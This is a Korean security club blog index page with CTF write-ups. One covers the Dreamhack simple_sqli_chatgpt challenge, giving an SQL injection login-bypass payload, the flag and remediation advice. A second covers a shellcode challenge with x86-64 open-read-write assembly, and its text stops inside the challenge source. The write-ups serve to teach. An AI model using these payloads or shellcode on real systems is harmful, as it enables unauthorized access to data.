<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"swu-swing.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="SW1NGL0G">
<meta property="og:url" content="https://swu-swing.github.io/index.html">
<meta property="og:site_name" content="SW1NGL0G">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="SWING">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://swu-swing.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>SW1NGL0G</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">SW1NGL0G</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">SWING</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/swu.swing@gmail.com" title="E-Mail → swu.swing@gmail.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://swuswing.com/" title="https:&#x2F;&#x2F;swuswing.com&#x2F;" rel="noopener" target="_blank">SWING Official Website</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://swu-swing.github.io/2025/05/20/3103_250520/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SWING">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SW1NGL0G">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SW1NGL0G">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/05/20/3103_250520/" class="post-title-link" itemprop="url">지원서 뜯어보기 [하] dreamhack simple_sqli_chatgpt</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-05-20 04:00:00 / Modified: 05:26:12" itemprop="dateCreated datePublished" datetime="2025-05-20T04:00:00+09:00">2025-05-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/swinglog/" itemprop="url" rel="index"><span itemprop="name">swinglog</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <!-- 지원서 뜯어보기 [하] dreamhack simple_sqli_chatgpt -->

<h1 id="들어가며"><a href="#들어가며" class="headerlink" title="들어가며"></a>들어가며</h1><p>2025년 32기 지원서는 상중하 세 문제로 이루어져 있었는데, 그 중 하 문제인 Dreamhack의 simple_sqli_chatgpt의 문제에 대한 라이트업을 써보려 한다.</p>
<p>뭐 인터넷에 이미 나와있는 라이트업이 많긴 하지만 지원서 문제를 낸 입장에서도 그렇고, 기술블로그에 올리기도 하고 싶어서 써보려 한다.<br><br><br></p>
<h1 id="SQL-Injection이란"><a href="#SQL-Injection이란" class="headerlink" title="SQL Injection이란?"></a>SQL Injection이란?</h1><p>우선 본격적으로 라이트업을 쓰기 전에 SQL Injection이 뭔지에 대해 알아볼 것이다.</p>
<p>문제 이름이 simple sqli chatgpt인 만큼, sqli에 대해 알고 넘어가는 게 중요하다.</p>
<p>**SQL Injection(SQLi)**은 웹 애플리케이션에서 사용자 입력을 적절히 검증하지 않고 SQL 쿼리에 포함시킬 때 발생하는 보안 취약점이다.</p>
<p>공격자는 이를 이용해 데이터베이스의 정보를 조회, 수정, 삭제하거나 인증을 우회할 수 있다.</p>
<p>예를 들어, 다음과 같은 쿼리가 있다고 가정하겠다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;rlozll&#x27; AND password = &#x27;swing31&#x27;;</span><br></pre></td></tr></table></figure>

<p>만약 사용자가 username에 ‘ OR ‘1’&#x3D;’1을 입력하면, 쿼리는 다음과 같이 변형된다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; AND password = &#x27;swing31&#x27;;</span><br></pre></td></tr></table></figure>

<p>이렇게 되면 1&#x3D;1이라는 조건이 항상 참이지 인증을 우회할 수 있게 된다.</p>
<p>또다른 예시를 들어보겠다. 아래와 같은 코드가 있다고 가정하겠다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = request.form[&#x27;username]</span><br><span class="line">query = f&quot;SELECT * FROM users WHERE username=&#x27;&#123;username&#125;&#x27;&quot;</span><br></pre></td></tr></table></figure>
<p>이때 사용자가 username에 admin’–을 입력하면 쿼리는 다음과 같이 된다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; --&#x27;</span><br></pre></td></tr></table></figure>
<p>– 이후는 주석 처리되기 때문에 읽어내지 못한다.</p>
<p>따라서 조건이 조작되어 인증 우회나 정보 탈취가 가능하게 된다.</p>
<p><br><br></p>
<h1 id="문제-개요-simple-sqli-chatgpt"><a href="#문제-개요-simple-sqli-chatgpt" class="headerlink" title="문제 개요: simple_sqli_chatgpt"></a>문제 개요: simple_sqli_chatgpt</h1><p>문제 링크: <a target="_blank" rel="noopener" href="https://dreamhack.io/wargame/challenges/769">https://dreamhack.io/wargame/challenges/769</a><br>이 문제는 로그인 페이지에서 사용자 입력을 통해 SQL Injection을 수행하여 플래그를 획득하는 것이 목표다. <br></p>
<p><img src="/images/3103_250520_image1.png" alt="그림 1. https://github.com/user-attachments/assets/3178eaab-3ccc-4725-9f65-c95377d26422, [문제 풀이 중 로그인 화면면]"></p>
<center><span style="font-size: 90%;">그림 1. [문제 풀이 중 로그인 화면]</span><br><span style="font-size: 70%;"></span></center>
<br>

<p>로그인 페이지에는 userlevel이라는 단일 입력 필드를 제공하고 있으며, 이를 기반으로 사용자를 인증한다.<br><br><br></p>
<h1 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h1><p>문제에서 제공하는 코드 중 주요 부분만 추출해 보도록 하겠다.<br><br><br></p>
<h2 id="1-데이터베이스-생성"><a href="#1-데이터베이스-생성" class="headerlink" title="1. 데이터베이스 생성"></a>1. 데이터베이스 생성</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.execute(&#x27;create table users(userid char(100), userpassword char(100), userlevel integer);&#x27;)</span><br><span class="line">db.execute(f&#x27;insert into users(userid, userpassword, userlevel) values (&quot;guest&quot;, &quot;guest&quot;, 0), (&quot;admin&quot;, &quot;&#123;binascii.hexlify(os.urandom(16)).decode(&quot;utf8&quot;)&#125;&quot;, 0);&#x27;)</span><br></pre></td></tr></table></figure>
<ul>
<li>userid: guest&#x2F;admin</li>
<li>userpassword: guest&#x2F;랜덤값</li>
<li><strong>모두 userlevel &#x3D; 0</strong>으로 설정되어 있음<br></li>
</ul>
<h2 id="2-쿼리-수행"><a href="#2-쿼리-수행" class="headerlink" title="2. 쿼리 수행"></a>2. 쿼리 수행</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userlevel = request.form.get(&#x27;userlevel&#x27;)</span><br><span class="line">res = query_db(f&quot;select * from users where userlevel=&#x27;&#123;userlevel&#125;&#x27;&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>userlevel 값을 사용자 입력에서 가져와 <strong>직접 쿼리에 삽입</strong></li>
<li>파라미터 바인딩을 사용하지 않고, 문자열 포매팅을 사용 -&gt; <strong>SQL Injection 가능</strong><br></li>
</ul>
<h2 id="3-조건-판단"><a href="#3-조건-판단" class="headerlink" title="3. 조건 판단"></a>3. 조건 판단</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if res:</span><br><span class="line">    userid = res[0]</span><br><span class="line">    userlevel = res[2]</span><br><span class="line">    if userid == &#x27;admin&#x27; and userlevel == 0:</span><br><span class="line">        return f&#x27;hello &#123;userid&#125; flag is &#123;FLAG&#125;&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li>조건을 만족하면 플래그 노출</li>
<li>즉, <strong>userlevel&#x3D;0 이면서 userid&#x3D;’admin’인 경우</strong> 플래그가 출력됨<br></li>
</ul>
<h1 id="핵심-취약점"><a href="#핵심-취약점" class="headerlink" title="핵심 취약점"></a>핵심 취약점</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = query_db(f&quot;select * from users where userlevel=&#x27;&#123;userlevel&#125;&#x27;&quot;)</span><br></pre></td></tr></table></figure>
<p>이 부분에서 userlevel에 아무런 필터링 없이 쿼리에 삽입된다.</p>
<p>이로 인해 공격자는 다음과 같이 조작할 수 있게 된다.<br><br><br></p>
<h1 id="SQL-Injection-시나리오"><a href="#SQL-Injection-시나리오" class="headerlink" title="SQL Injection 시나리오"></a>SQL Injection 시나리오</h1><blockquote>
<p>목표: userlvel 값 하나만 입력해서, <strong>userid가 ‘admin’인 행</strong>을 선택해야 함<br><br></p>
</blockquote>
<h2 id="공격-입력"><a href="#공격-입력" class="headerlink" title="공격 입력"></a>공격 입력</h2><p>다음 값을 userlevel에 입력하도록 하겠다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; and userid=&#x27;admin&#x27; --</span><br></pre></td></tr></table></figure>
<br>

<h2 id="실제-쿼리-동작-방식"><a href="#실제-쿼리-동작-방식" class="headerlink" title="실제 쿼리 동작 방식"></a>실제 쿼리 동작 방식</h2><p>입력값을 반영한 최종 쿼리는 다음과 같다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE userlevel=&#x27;0&#x27; and userid=&#x27;admin&#x27; --&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>userlevel&#x3D;’0’ 조건 만족</li>
<li>userid&#x3D;’admin’ 조건 만족</li>
<li>– 뒤는 주석 처리 -&gt; 쿼리 구문 오류 방지 (읽지 못하도록)<br></li>
</ul>
<h1 id="공격-수행"><a href="#공격-수행" class="headerlink" title="공격 수행"></a>공격 수행</h1><p><img src="/3103_250520_image2.png" alt="alt text"></p>
<center><span style="font-size: 90%;">그림 2. [플래그 출력 화면]</span><br><span style="font-size: 70%;"></span></center><br>

<p>이렇게 다음과 같은 플래그를 얻을 수 있었다.</p>
<p><strong>Flag: DH{chatGPT_told_me_a_lullaby}</strong><br><br></p>
<h1 id="대응-방안"><a href="#대응-방안" class="headerlink" title="대응 방안"></a>대응 방안</h1><p>문제는 다 풀었지만, 대응 방안도 간단히 알아보도록 하겠다.<br><br><br></p>
<h2 id="파라미터-바인딩-사용"><a href="#파라미터-바인딩-사용" class="headerlink" title="파라미터 바인딩 사용"></a>파라미터 바인딩 사용</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.execute(&quot;SELECT * FROM users WHERE userlevel=?&quot;, (userlevel,))</span><br></pre></td></tr></table></figure>
<br>

<h2 id="입력-검증"><a href="#입력-검증" class="headerlink" title="입력 검증"></a>입력 검증</h2><ul>
<li>숫자 입력값만 허용: int(userlevel)</li>
<li>화이트리스트 기반 검증<br></li>
</ul>
<h2 id="최소-권한-DB-사용자-설정"><a href="#최소-권한-DB-사용자-설정" class="headerlink" title="최소 권한 DB 사용자 설정"></a>최소 권한 DB 사용자 설정</h2><ul>
<li>데이터 조회 권한만 있는 사용자 사용</li>
<li>시스템 테이블 접근 제한 <br></li>
</ul>
<h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>드림핵의 simple_sqli_chatgpt 문제는 SQL Injection의 핵심과 위험성을 간단히 보여주는 예제다.</p>
<p>본인은 해당 문제를 1학년 때 처음 풀어봤는데, 꽤 재밌게 풀었던 기억이 난다.</p>
<p><del>그렇게 풋풋했는데 지금은 어느덧 사망년이다.</del></p>
<p>다음 기술블로그는 어떤 걸 써볼지 고민해봐야지.<br><br><br></p>
<h1 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h1><p>SQL Injection. (n.d.). OWASP. <a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></p>
<p>simple_sqli_chatgpt. (n.d.). Dreamhack. <a target="_blank" rel="noopener" href="https://dreamhack.io/wargame/challenges/769">https://dreamhack.io/wargame/challenges/769</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://swu-swing.github.io/2025/05/17/3102_250517/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SWING">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SW1NGL0G">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SW1NGL0G">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/05/17/3102_250517/" class="post-title-link" itemprop="url">지원서 뜯어보기 [중]</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-05-17 23:30:23" itemprop="dateCreated datePublished" datetime="2025-05-17T23:30:23+09:00">2025-05-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-05-20 04:29:28" itemprop="dateModified" datetime="2025-05-20T04:29:28+09:00">2025-05-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/swinglog/" itemprop="url" rel="index"><span itemprop="name">swinglog</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <!-- 지원서 뜯어보기 [중] -->

<h1 id="들어가며"><a href="#들어가며" class="headerlink" title="들어가며"></a>들어가며</h1><p>올해 32기 지원 서류에 있는 문제 중 하나인 포너블 문제를 풀어보려고 한다. 3문제 중 [중] 난이도의 이 문제만 포너블인데 아무도 풀지 않았다. 최대한 차근차근 풀이해보겠다.<br><br><br></p>
<h1 id="셸코드란"><a href="#셸코드란" class="headerlink" title="셸코드란?"></a>셸코드란?</h1><p>셸코드(Shellcode)는 시스템의 특정 명령을 실행하는 작은 사이즈의 프로그램을 뜻하여, 일반적으로 기계어 코드로 작성되어 있다. 이는 셸을 획득하기 위한 익스플로잇을 목적으로 하기 위해 제작되는 어셈블리 코드 조각이라고도 볼 수 있다. 셸코드로 불리는 이유는 일반적으로 명령 셸을 시작시켜 그곳으로부터 공격자가 영향 받은 컴퓨터를 제어하기 때문이다.<br><br></p>
<h2 id="orw-셸코드"><a href="#orw-셸코드" class="headerlink" title="orw 셸코드"></a>orw 셸코드</h2><p>orw 셸코드란란 파일을 열고(Open) 내용을 읽은 후(Read) 화면에 출력(Write)하는 셸코드로 여기서 open, read, write 시스템 호출을 순서대로 사용한다.<br>여기서 시스템 호출(system call)이란 운영 체제의 커널이 제공하는 서비스에 대해 응용 프로그램의 요청에 따라 커널에 접근하기 위한 인터페이스이다.<br>아래는 orw 셸코드에 필요한 syscall에 대한 내용을 표로 정리한 것이다.</p>
<table>
<thead>
<tr>
<th>syscall</th>
<th>%rax</th>
<th>arg0 (%rdi)</th>
<th>arg1 (%rsi)</th>
<th>arg2 (%rdx)</th>
</tr>
</thead>
<tbody><tr>
<td>read</td>
<td>0x00</td>
<td>unsigned int fd</td>
<td>char *buf</td>
<td>size_t count</td>
</tr>
<tr>
<td>write</td>
<td>0x01</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
</tr>
<tr>
<td>open</td>
<td>0x02</td>
<td>const char *filename</td>
<td>int flags</td>
<td>umode_t mode</td>
</tr>
</tbody></table>
<p>작동 방식은 open 함수로 파일을 연 후, 생성된 fd를 read 함수에 넘기고 읽은 후에 스택에 결과를 저장하게 된다.<br><br></p>
<h3 id="1-open-syscall"><a href="#1-open-syscall" class="headerlink" title="1. open syscall"></a>1. open syscall</h3><p>시그니처: *<strong>int open(const char <em>pathname, int flags, mode_t mode);</em></strong></p>
<p>역할: 파일을 연다.</p>
<p>시스템 호출 번호: rax &#x3D; 2</p>
<p>레지스터 사용:</p>
<p>rdi &#x3D;&gt; 파일 경로 (예: &#x2F;tmp&#x2F;flag)</p>
<p>rsi &#x3D;&gt; flag(열기 옵션 (O_RDONLY, O_WRONLY, O_RDWR 등))</p>
<p>rdx &#x3D;&gt; mode(O_RDONLY(읽기 전용)- 0, O_WRONLY(쓰기 전용)- 1, O_RDWR(읽기&#x2F;쓰기)- 2) *orw 셸코드에서는 O_RDONLY이기 때문에 0으로 설정</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">push 0x67</span><br><span class="line">mov rax, 0x616c662f706d742f     ;스택에는 리틀 엔디안 형식으로 8 바이트 단위로만 값을 push할 수 있으므로 0x67를 먼저 push한 후, 0x616c662f706d742f를 push</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp          ; rdi = &quot;/tmp/flag&quot;</span><br><span class="line">xor rsi, rsi          ; O_RDONLY = 0</span><br><span class="line">xor rdx, rdx          ; mode를 0으로 설정</span><br><span class="line">mov rax, 2            ; open syscall 호출(2)</span><br><span class="line">syscall               ; open(&quot;/tmp/flag&quot;, RD_ONLY, NULL)</span><br></pre></td></tr></table></figure>
<p>syscall의 반환 값, 위 코드에서 보면 open으로 획득한 &#x2F;tmp&#x2F;flag의 fd는 rax에 저장된다.<br><br></p>
<h3 id="2-read-syscall"><a href="#2-read-syscall" class="headerlink" title="2. read syscall"></a>2. read syscall</h3><p>역할: 파일에서 데이터를 읽는다.</p>
<p>시그니처: *<strong>ssize_t read(int fd, void <em>buf, size_t count);</em></strong></p>
<p>시스템 호출 번호: rax &#x3D; 0</p>
<p>레지스터 사용:</p>
<p>rdi &#x3D;&gt; 파일 디스크립터</p>
<p>rsi &#x3D;&gt; 읽은 데이터를 저장할 버퍼 주소</p>
<p>rdx &#x3D;&gt; 읽을 바이트 수</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, rax          ; rdi = fd</span><br><span class="line">mov rsi, rsp</span><br><span class="line">sub rsi, 0x30         ; rsi = rsp-0x30 ; 0x30바이트 읽을 거니까 읽을 버퍼 주소는 rsp-0x30</span><br><span class="line">mov rdx, 0x30         ; read 48 바이트</span><br><span class="line">mov rax, 0            ; read syscall 호출(0)</span><br><span class="line">syscall               ; read(fd, buf, 0x30)</span><br></pre></td></tr></table></figure>
<br>
### 3. write syscall
역할: 데이터를 출력한다.

<p>시그니처: *<strong>ssize_t write(int fd, const void <em>buf, size_t count);</em></strong></p>
<p>시스템 호출 번호: rax &#x3D; 1</p>
<p>레지스터 사용:</p>
<p>rdi &#x3D;&gt; 출력할 대상의 fd (1은 표준 출력 stdout)</p>
<p>rsi &#x3D;&gt; 출력할 버퍼 주소</p>
<p>rdx &#x3D;&gt; 출력할 바이트 수</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 1            ; stdout</span><br><span class="line">mov rdx, 0x30         ; 48바이트 출력 예정, rsi에 출력할 버퍼 주소는 위 read 부분에 이미 같은 주소 저장되어 있어서 작성 생략략</span><br><span class="line">mov rax, 1            ; read syscall 호출(1)</span><br><span class="line">syscall               ; write(fd, buf, 0x30)</span><br></pre></td></tr></table></figure>

<p>사실 여기까지 orw 셸코드의 개념을 알아봤으면 이제 문제를 풀 방법을 선택할 수 있는데 첫번째는 위 asm 전체 코드를 다 합쳐서 컴파일 한 뒤, objdump를 이용하여 디스어셈블해서 필요한 셸코드만 추출한 후 최종 셸코드를 문제 서버에 전송하는 방법이다. 두번째는 pwntools에 셸코드를 작성해주는 함수인 shellcraft()가 있는데 이걸 이용하여 코드를 짠 다음 해당 익스플로잇 코드를 실행시키는 것이다.<br>아무래도 두번째 방법이 더 쉽기 때문에 두번째 방법으로 진행하도록 하겠다.<br><br><br><br>#문제 풀기</p>
<p><img src="/images/3102_250517_image1.png" alt="그림 1. 문제 내용 확인"></p>
<center><span style="font-size: 90%;">그림 1. 문제 내용 확인</span><br><span style="font-size: 70%;"></span></center><br>
flag의 위치는 "/home/shell_basic/flag_name_is_loooooong"라는 힌트가 나와있고 execve, execveat 시스템 콜을 사용하지 말라고 하니 위에서 했던 orw를 이용하면 될 것 같다. 문제 파일을 보면 shell_basic 실행파일과 shell_basic.c 코드 파일이 있다. 코드 파일 먼저 살펴 보겠다.
<br>
##코드
일단 문제 코드 먼저 보겠다.

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Compile: gcc -o shell_basic shell_basic.c -lseccomp</span></span><br><span class="line"><span class="comment">// apt install seccomp libseccomp-dev</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alarm_handler</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TIME OUT&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    signal(SIGALRM, alarm_handler);</span><br><span class="line">    alarm(<span 